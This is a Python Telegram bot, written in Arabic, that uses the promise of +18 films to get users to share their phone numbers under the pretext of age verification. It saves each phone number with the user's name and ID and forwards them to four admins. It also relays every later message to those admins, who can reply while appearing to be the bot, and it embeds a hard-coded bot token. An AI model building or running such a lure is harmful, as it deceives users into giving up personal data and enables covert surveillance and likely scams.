from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import json, os
from datetime import datetime

TOKEN = "8608854255:AAHCS0Kf-qh3VfUy8fKrXUA72Ivt-Q5XD7Q"
ADMIN_IDS = [6595283177, 6064955422, 8980708217, 8438309342]
SECOND_BOT_LINK = "https://t.me/girls00193_bot"

DB_FILE = "users.json"
LOGS_FILE = "logs.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def log_action(user_id, action, text=""):
    logs = {}
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    if str(user_id) not in logs:
        logs[str(user_id)] = []
    logs[str(user_id)].append({"time": datetime.now().strftime("%H:%M"), "action": action, "text": text})
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_action(update.effective_user.id, "ضغط /start")
    btn = KeyboardButton("✅ هل انت فوق +18 ؟", request_contact=True)
    markup = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "هلق انت فوق +18؟\n\nلمشاهدة الافلام +18 يجب تأكيد عمرك\nاضغط على الزر بالأسفل للتأكيد ومشاركة رقمك 👇",
        reply_markup=markup
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user
    log_action(user.id, "شارك الرقم", contact.phone_number)
    db = load_db()
    db[str(user.id)] = {"phone": contact.phone_number, "username": user.username, "name": user.full_name, "id": user.id}
    save_db(db)
    await update.message.reply_text(
        "✅ تم استلام رقمك\n\nالرجاء الانتظار 5 الى 10 دقائق للتأكد من العمر +18 ⏳",
        reply_markup=ReplyKeyboardRemove()
    )
    msg_admin = f"🔔 طلب تحقق جديد\nالاسم: {user.full_name}\nالايدي: {user.id}\nالرقم: {contact.phone_number}\nاليوزر: @{user.username if user.username else 'لا يوجد'}"
    kb = [
        [InlineKeyboardButton("✅ موافقة وارسال زر البوت", callback_data=f"approve_{user.id}")],
        [InlineKeyboardButton("❌ رفض", callback_data=f"reject_{user.id}")]
    ]
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=msg_admin, reply_markup=InlineKeyboardMarkup(kb))
        except:
            pass

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id not in ADMIN_IDS:
        return
    action, uid = query.data.split("_")
    uid = int(uid)
    if action == "approve":
        log_action(uid, "تمت الموافقة", str(query.from_user.id))
        kb = [[InlineKeyboardButton("🎬 دخول لبوت الافلام", url=SECOND_BOT_LINK)]]
        try:
            await context.bot.send_message(chat_id=uid, text="✅ تم التحقق، تمت الموافقة!\nاضغط للدخول:", reply_markup=InlineKeyboardMarkup(kb))
            await query.edit_message_text(f"✅ تمت الموافقة لـ {uid}")
        except:
            await query.edit_message_text(f"❌ المستخدم {uid} حاظر البوت")
    else:
        try:
            await context.bot.send_message(chat_id=uid, text="❌ تم رفض طلبك")
        except:
            pass
        await query.edit_message_text(f"❌ تم رفض {uid}")

async def watch_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in ADMIN_IDS:
        return
    text = update.message.text or "[ملف/صورة]"
    log_action(user.id, "رسالة", text)
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=f"👀 {user.full_name} ({user.id}): {text}\n/reply {user.id} للرد")
        except:
            pass

async def chat_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = int(query.data.split("_")[1])
    await query.answer()
    context.user_data["chatting_with"] = uid
    await query.message.reply_text(f"تكلم الآن مع {uid}\nاكتب رسالتك، /end للخروج")

# الرد يظهر كأنه من البوت
async def admin_talk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if "chatting_with" not in context.user_data:
        return
    if update.message.text == "/end":
        del context.user_data["chatting_with"]
        await update.message.reply_text("خرجت")
        return
    target = context.user_data["chatting_with"]
    await context.bot.send_message(chat_id=target, text=update.message.text)
    await update.message.reply_text("تم")

async def reply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if len(context.args) < 2:
        await update.message.reply_text("استخدم: /reply الايدي الرسالة")
        return
    target = int(context.args[0])
    msg = " ".join(context.args[1:])
    try:
        await context.bot.send_message(chat_id=target, text=msg)
        await update.message.reply_text("تم")
    except:
        await update.message.reply_text("❌ ما قدرت ابعت - تأكد الايدي صح والمستخدم فاتح البوت")

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("reply", reply_cmd))
app.add_handler(CallbackQueryHandler(admin_callback, pattern="^(approve|reject)_"))
app.add_handler(CallbackQueryHandler(chat_button, pattern="^chat_"))
app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
app.add_handler(MessageHandler(filters.TEXT & filters.User(user_id=ADMIN_IDS) & ~filters.COMMAND, admin_talk), group=0)
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, watch_user), group=1)

print("البوت شغال - 4 مشرفين - بدون من الادارة")
app.run_polling()
